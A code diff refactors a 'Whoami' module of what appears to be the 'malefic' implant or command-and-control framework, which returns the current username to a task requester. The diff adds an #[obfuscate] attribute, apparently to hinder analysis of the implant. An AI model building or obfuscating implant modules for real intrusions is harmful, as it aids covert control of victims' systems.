@@ -1,5 +1,5 @@
-use malefic_proto::proto::modulepb::Response;
 use crate::prelude::*;
+use malefic_proto::proto::modulepb::Response;
 
 pub struct Whoami {}
 
@@ -8,11 +8,17 @@ pub struct Whoami {}
 impl Module for Whoami {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for Whoami {
-     async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _sender: &mut malefic_proto::module::Output) -> ModuleResult {
+#[obfuscate]
+impl malefic_module::ModuleImpl for Whoami {
+    async fn run(
+        &mut self,
+        id: u32,
+        receiver: &mut malefic_module::Input,
+        _sender: &mut malefic_module::Output,
+    ) -> ModuleResult {
         let _ = check_request!(receiver, Body::Request)?;
         let mut response = Response::default();
-        response.output = malefic_helper::common::sysinfo::username();
+        response.output = malefic_sysinfo::username();
         Ok(TaskResult::new_with_body(id, Body::Response(response)))
     }
 }
